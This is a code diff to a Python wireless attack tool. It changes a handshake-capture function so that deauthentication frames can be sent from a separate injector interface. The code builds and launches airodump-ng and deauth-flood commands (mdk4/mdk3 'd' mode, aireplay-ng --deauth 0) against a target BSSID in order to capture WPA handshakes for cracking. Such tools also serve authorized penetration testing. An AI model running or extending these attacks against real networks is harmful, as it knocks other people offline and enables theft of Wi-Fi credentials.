@@ -83,7 +83,7 @@ def _kill_proc(proc):
             pass
 
 
-def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown"):
+def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown", injector_interface=None):
     if not shutil.which("airodump-ng"):
         logger.error("airodump-ng not found")
         print(f"{C_RED}[!] airodump-ng not found. Install: sudo apt install aircrack-ng{C_RESET}")
@@ -99,7 +99,8 @@ def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown"):
     cap_prefix = os.path.join(tmpdir, "cap")
     bl_file = os.path.join(tmpdir, "bl.txt")
 
-    print(f"{C_YELLOW}[*] Using: airodump-ng + {deauth_tool}{C_RESET}")
+    inj_iface = injector_interface or interface
+    print(f"{C_YELLOW}[*] Using: airodump-ng on {interface} + {deauth_tool} on {inj_iface}{C_RESET}")
     print(f"{C_YELLOW}[*] Capturing handshake for {mask_bssid(bssid)} on ch{channel} (timeout: {timeout}s){C_RESET}")
 
     airodump_proc = None
@@ -127,10 +128,10 @@ def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown"):
             f.write(bssid + "\n")
 
         if deauth_tool in ("mdk4", "mdk3"):
-            deauth_cmd = [deauth_tool, interface, "d", "-b", bl_file, "-c", str(channel)]
+            deauth_cmd = [deauth_tool, inj_iface, "d", "-b", bl_file, "-c", str(channel)]
         else:
             deauth_cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid,
-                          "--ignore-negative-one", interface]
+                          "--ignore-negative-one", inj_iface]
 
         # Deauth strategy: BURST then a LONG quiet wait. A continuous deauth
         # flood (mdk4 'd' mode / aireplay --deauth 0) keeps kicking clients, so
